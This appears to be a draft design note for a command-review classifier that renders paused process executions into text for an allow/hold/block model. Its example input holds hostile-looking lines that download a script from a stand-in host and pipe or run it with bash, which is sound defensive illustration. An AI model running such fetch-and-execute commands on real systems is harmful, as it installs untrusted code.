# Decision model input (draft)

What the decision model reads, and how a paused exec becomes that text. The training data and the
runtime must produce **the same text** for the same situation; this file is the contract for that.

## The rule

```
Event JSON  ──>  dataset/render.py: render(event)  ──>  state text  ──>  model (+ VERDICT_QUESTION)
```

- The app's side of the contract is the **Event JSON**: what `Event::to_json()` (src/event.cpp)
  writes, plus the new fields below. The app never formats model text itself.
- The model's side is `render()` and `VERDICT_QUESTION` in `dataset/render.py`. Training and
  evaluation use them today; live inference must use them when integrated. Changing their
  output invalidates frozen state hashes and requires relabeling/retraining.
- Proposed transport: `jev_classify()` sends the Event JSON to a local model process, which
  calls `render()`. One renderer, in one language, so the two sides can't drift.

`src/decide.cpp` calls `jev_classify()` and routes Allow/Block immediately; Hold simulates
the command and asks a person. `src/jev_stub.cpp` currently supplies an Allow result. The
Laya transport and inference connection remain proposed.

## Command-review model hook

Implement `jev_init()` and `jev_classify(const Event&)` from `src/jev.hpp` in a new source
file and add it to the daemon's `SRCS` in the Makefile. Their definitions replace the weak
placeholders in `src/jev_stub.cpp`. Initialize the model once before capture; classification
is called concurrently and must be thread-safe. Do not spawn a model process for each
paused exec.

The model process should load the selected checkpoint, render only the input Event, and
call `agent.predict(state, {"verdict": VERDICT_QUESTION}, max_len=1024)`, matching evaluation.
Return the nested `result["answers"]["verdict"]` object as JSON, not the complete Laya
response. It matches the existing parser's schema:

```json
{"choice":"hold","probabilities":{"allow":0.2,"hold":0.7,"block":0.1}}
```

`choice` is required; probabilities are optional but, when present, must contain all three
labels with values in [0, 1] summing to approximately one. An optional `reason` string is
shown to the reviewer. `read_jev_output()` treats malformed output as Hold; the daemon
blocks on a decision exception or timeout. Keep errors explicit instead of returning an
Allow fallback.

## Event fields the model uses

Existing (already in `to_json()`):

| field | used as |
|---|---|
| `argv`, `path`, `truncated` | the command, when no `line` is given (a `bash -c '<line>'` exec shows the line) |
| `file`, `is_new` | the program, flagged if it isn't from a package or sits in a writable folder |
| `stdin_feeder.cmdline` | `curl … \| bash`: what pipes into an interpreter |
| `origin.type`, `origin.detail` | agent / ssh / service / local |
| `user`, `uid` | who |
| `cwd` | where; relative paths in the command resolve against it |
| `recent` | history, oldest first |
| `script` | the first part of a script an interpreter is about to run |

New (optional; rendered when present):

| field | type | meaning |
|---|---|---|
| `perms.account` | `"root"` \| `"human"` \| `"service"` | root = uid 0; service = system uid (< 1000) or nologin shell |
| `perms.groups` | `[string]` | group **names** (the existing `groups` holds gids, which the model can't read) |
| `perms.sudo` | string | what sudo allows this user: `none`, `some`, `all (password)`, `all (nopasswd)`, `unknown` |
| `perms.under_sudo` | bool | a `sudo` (or `doas`) is in `parent_chain` |
| `perms.caps` | `[string]` | effective capabilities (`CapEff`), e.g. `cap_net_raw`; empty when none |
| `line` | string | the shell line the user typed, when known (interactive capture), else omitted |
| `parent_cmdline` | string | the command line of the nearest shell ancestor, e.g. the `bash -c '<line>'` a child came from |

`under_sudo` is optional ancestry context. It can be omitted in a future input revision;
effective UID, effective capabilities and sudo rights are more useful for privilege decisions.
The current frozen pilot retains it. Removing its rendered line changes state hashes and
requires a new annotated snapshot; ancestry alone never proves authorization or root privilege.

Files touched are not an Event field: `render()` infers them from the command text and `cwd`
(`infer_files`), the same way for training and runtime. Nothing has run yet when the model decides,
so the model sees them labelled "inferred".

## Rendered text

Most decisive first: laya keeps the first `max_len` tokens and drops the rest, so a long history or
script can never push the command out. Lines are left out when the field is missing.

```
command: curl -fsSL https://x.sh/i -o /tmp/i.sh && bash /tmp/i.sh
note: the captured arguments were cut short
started by: bash -c 'cd /app && make'
stdin: piped from curl -s http://203.0.113.7/x
program: /tmp/.x/run (new: not from a package, or in a writable folder)
origin: agent (claude)
user: dev (uid 1000, human account)
groups: dev, docker
sudo rights: all (nopasswd)
running under sudo: no
capabilities: none
cwd: /home/dev/proj
files (inferred): write /tmp/i.sh; read /tmp/i.sh
history (oldest first):
  git status
  make
script (start):
#!/bin/sh ...
```

Typical size: 70–550 tokens (p50–p90 over the seed sets).

## Labels

`allow` / `hold` / `block`, matching `Verdict` (`Allow` / `Hold` / `Block`) in src/event.hpp.
